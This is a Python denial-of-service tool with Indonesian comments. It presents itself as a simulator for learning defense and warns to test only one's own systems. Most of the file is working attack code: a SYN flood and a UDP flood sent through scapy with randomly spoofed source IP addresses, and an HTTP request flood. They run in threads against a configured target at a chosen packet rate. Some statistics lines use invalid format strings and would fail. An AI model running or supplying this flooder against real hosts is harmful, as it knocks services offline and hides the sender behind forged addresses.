#!/usr/bin/env python3
"""
DDoS Simulator untuk Pembelajaran Defense
⚠️ HANYA UNTUK TESTING SISTEM SENDIRI!
"""

import time
import random
import threading
import socket
import struct
from scapy.all import *
import config
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
from rich.text import Text
import pyfiglet

console = Console()

class DDoSSimulator:
    def __init__(self):
        self.target_host = config.SIMULATOR_CONFIG['target_host']
        self.target_port = config.SIMULATOR_CONFIG['target_port']
        self.duration = config.SIMULATOR_CONFIG['attack_duration']
        self.packets_per_second = config.SIMULATOR_CONFIG['packets_per_second']
        self.running = False
        self.attack_stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': 0,
            'attack_types': []
        }
    
    def show_banner(self):
        """Menampilkan banner aplikasi"""
        banner = pyfiglet.figlet_format("DDoS SIMULATOR", font="slant")
        console.print(Panel(banner, style="bold red"))
        console.print("[bold yellow]⚠️  PERINGATAN:[/bold yellow] Hanya untuk pembelajaran dan testing defensif!")
        console.print("[bold red]JANGAN PERNAH gunakan untuk menyerang sistem orang lain![/bold red]\n")
    
    def syn_flood_attack(self):
        """Simulasi SYN Flood Attack"""
        try:
            while self.running:
                # Buat paket SYN dengan source IP yang random
                source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                source_port = random.randint(1024, 65535)
                
                # Buat paket TCP SYN
                ip_layer = IP(src=source_ip, dst=self.target_host)
                tcp_layer = TCP(sport=source_port, dport=self.target_port, flags="S")
                
                # Kirim paket
                send(ip_layer/tcp_layer, verbose=False)
                
                self.attack_stats['packets_sent'] += 1
                self.attack_stats['bytes_sent'] += 54  # Ukuran paket TCP SYN
                
                time.sleep(1.0 / self.packets_per_second)
        except Exception as e:
            console.print(f"[red]Error dalam SYN Flood: {e}[/red]")
    
    def udp_flood_attack(self):
        """Simulasi UDP Flood Attack"""
        try:
            while self.running:
                # Buat paket UDP dengan data random
                source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                source_port = random.randint(1024, 65535)
                
                # Data random untuk UDP
                payload = b"X" * random.randint(64, 1024)
                
                # Buat paket UDP
                ip_layer = IP(src=source_ip, dst=self.target_host)
                udp_layer = UDP(sport=source_port, dport=self.target_port)
                
                # Kirim paket
                send(ip_layer/udp_layer/payload, verbose=False)
                
                self.attack_stats['packets_sent'] += 1
                self.attack_stats['bytes_sent'] += len(payload) + 28  # IP + UDP header
                
                time.sleep(1.0 / self.packets_per_second)
        except Exception as e:
            console.print(f"[red]Error dalam UDP Flood: {e}[/red]")
    
    def http_flood_attack(self):
        """Simulasi HTTP Flood Attack"""
        try:
            while self.running:
                # Buat HTTP request dengan User-Agent yang berbeda
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
                ]
                
                # Buat HTTP request
                http_request = f"""GET / HTTP/1.1\r
Host: {self.target_host}\r
User-Agent: {random.choice(user_agents)}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r
\r
"""
                
                # Kirim HTTP request
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target_host, self.target_port))
                    sock.send(http_request.encode())
                    sock.close()
                    
                    self.attack_stats['packets_sent'] += 1
                    self.attack_stats['bytes_sent'] += len(http_request.encode())
                except:
                    pass
                
                time.sleep(1.0 / self.packets_per_second)
        except Exception as e:
            console.print(f"[red]Error dalam HTTP Flood: {e}[/red]")
    
    def start_attack(self, attack_type="mixed"):
        """Memulai simulasi serangan"""
        self.show_banner()
        
        console.print(f"[bold blue]Target:[/bold blue] {self.target_host}:{self.target_port}")
        console.print(f"[bold blue]Durasi:[/bold blue] {self.duration} detik")
        console.print(f"[bold blue]Paket/detik:[/bold blue] {self.packets_per_second}")
        console.print(f"[bold blue]Tipe Serangan:[/bold blue] {attack_type}\n")
        
        # Konfirmasi sebelum memulai
        confirm = input("Apakah Anda yakin ingin memulai simulasi? (y/N): ")
        if confirm.lower() != 'y':
            console.print("[yellow]Simulasi dibatalkan[/yellow]")
            return
        
        self.running = True
        self.attack_stats['start_time'] = time.time()
        
        # Buat thread untuk setiap tipe serangan
        threads = []
        
        if attack_type == "syn" or attack_type == "mixed":
            t1 = threading.Thread(target=self.syn_flood_attack)
            threads.append(t1)
            self.attack_stats['attack_types'].append('SYN Flood')
        
        if attack_type == "udp" or attack_type == "mixed":
            t2 = threading.Thread(target=self.udp_flood_attack)
            threads.append(t2)
            self.attack_stats['attack_types'].append('UDP Flood')
        
        if attack_type == "http" or attack_type == "mixed":
            t3 = threading.Thread(target=self.http_flood_attack)
            threads.append(t3)
            self.attack_stats['attack_types'].append('HTTP Flood')
        
        # Jalankan semua thread
        for thread in threads:
            thread.start()
        
        # Progress bar
        with Progress() as progress:
            task = progress.add_task("[cyan]Simulasi berjalan...", total=self.duration)
            
            while not progress.finished:
                progress.update(task, advance=1)
                time.sleep(1)
                
                # Update stats
                elapsed = time.time() - self.attack_stats['start_time']
                if elapsed > 0:
                    pps = self.attack_stats['packets_sent'] / elapsed
                    bps = self.attack_stats['bytes_sent'] / elapsed
                    
                    progress.console.print(f"[green]Paket terkirim:[/green] {self.attack_stats['packets_sent']}")
                    progress.console.print(f"[green]Bytes terkirim:[/green] {self.attack_stats['bytes_sent']:,}")
                    progress.console.print(f"[green]Paket/detik:[/green] {pps:.2f}")
                    progress.console.print(f"[green]Bytes/detik:[/green] {bps:.2f:,}")
        
        # Stop semua thread
        self.running = False
        for thread in threads:
            thread.join()
        
        self.show_final_stats()
    
    def show_final_stats(self):
        """Menampilkan statistik akhir serangan"""
        console.print("\n[bold green]=== STATISTIK SIMULASI ===[/bold green]")
        console.print(f"[blue]Total Paket:[/blue] {self.attack_stats['packets_sent']:,}")
        console.print(f"[blue]Total Bytes:[/blue] {self.attack_stats['bytes_sent']:,}")
        console.print(f"[blue]Durasi:[/blue] {self.duration} detik")
        console.print(f"[blue]Tipe Serangan:[/blue] {', '.join(self.attack_stats['attack_types'])}")
        
        if self.attack_stats['start_time'] > 0:
            elapsed = time.time() - self.attack_stats['start_time']
            console.print(f"[blue]Waktu Aktual:[/blue] {elapsed:.2f} detik")
            console.print(f"[blue]Rata-rata Paket/detik:[/blue] {self.attack_stats['packets_sent'] / elapsed:.2f}")
            console.print(f"[blue]Rata-rata Bytes/detik:[/blue] {self.attack_stats['bytes_sent'] / elapsed:.2f:,}")
        
        console.print("\n[bold yellow]Simulasi selesai! Sekarang Anda bisa test sistem pertahanan Anda.[/bold yellow]")

def main():
    """Main function"""
    simulator = DDoSSimulator()
    
    console.print("\n[bold cyan]Pilih tipe serangan untuk simulasi:[/bold cyan]")
    console.print("1. SYN Flood Attack")
    console.print("2. UDP Flood Attack") 
    console.print("3. HTTP Flood Attack")
    console.print("4. Mixed Attack (Semua tipe)")
    
    choice = input("\nPilihan Anda (1-4): ")
    
    attack_types = {
        "1": "syn",
        "2": "udp", 
        "3": "http",
        "4": "mixed"
    }
    
    if choice in attack_types:
        simulator.start_attack(attack_types[choice])
    else:
        console.print("[red]Pilihan tidak valid![/red]")

if __name__ == "__main__":
    main()
